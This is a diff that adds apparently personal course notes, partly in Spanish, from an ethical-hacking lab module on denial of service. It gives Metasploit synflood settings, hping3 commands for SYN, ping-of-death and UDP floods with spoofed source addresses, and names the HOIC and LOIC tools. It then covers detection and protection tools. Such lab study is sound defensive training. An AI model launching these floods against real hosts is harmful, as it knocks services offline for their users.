@@ -1,0 +1,32 @@
+10-Denial-of-Service
+
+    Perform DoS and DDoS attacks using various Techniques
+        Perform a DoS attack (SYN flooding) on a target host using Metasploit
+             In the msf command line, type use auxiliary/dos/tcp/synflood and press Enter to launch a SYN flood module.
+             set RHOST (Target IP Address),set RPORT 21,set SHOST (Spoofable IP Address) 
+
+        Perform a DoS attack on a target host using hping3
+            hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood (Syn attack)
+            hping3 -d 65538 -S -p 21 --flood (Target IP Address) (Ping of death)
+            hping3 -2 -p 139 --flood (Target IP Address) (UDP application layer flood attack)
+                -2: specifies the UDP mode; -p: specifies the destination port; and --flood: sends a huge number of packets.
+
+        Perform a DDoS attack using HOIC
+            Usando la herramienta en varias compus para atacar
+
+        Perform a DDoS attack using LOIC
+            Usando la herramienta en varias compus para atacar
+            Diferentes tipos de ataquesa posibles
+
+    Detect and protect against DoS and DDoS attacks
+        Detect and protect against DDoS attacks using Anti DDoS Guardian
+            3 tecniques
+            Activity Profiling: Profiles based on the average packet rate for a network flow, which consists of consecutive packets with similar packet header information
+            Sequential Change-point Detection: Filters network traffic by IP addresses, targeted port numbers, and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate over time
+            Wavelet-based Signal Analysis: Analyzes network traffic in terms of spectral components
+
+            Setup - Anti DDoS Guardian window 
+            Se ve el trafico y se bloquea una IP
+
+            You can also use other DoS and DDoS protection tools such as Imperva Incapsula DDoS Protection (https://www.incapsula.com), DOSarrest’s DDoS protection service (https://www.dosarrest.com), DDoS-GUARD (https://ddos-guard.net), and Cloudflare (https://www.cloudflare.com) to protect organization’s systems and networks from DoS and DDoS attacks.
+
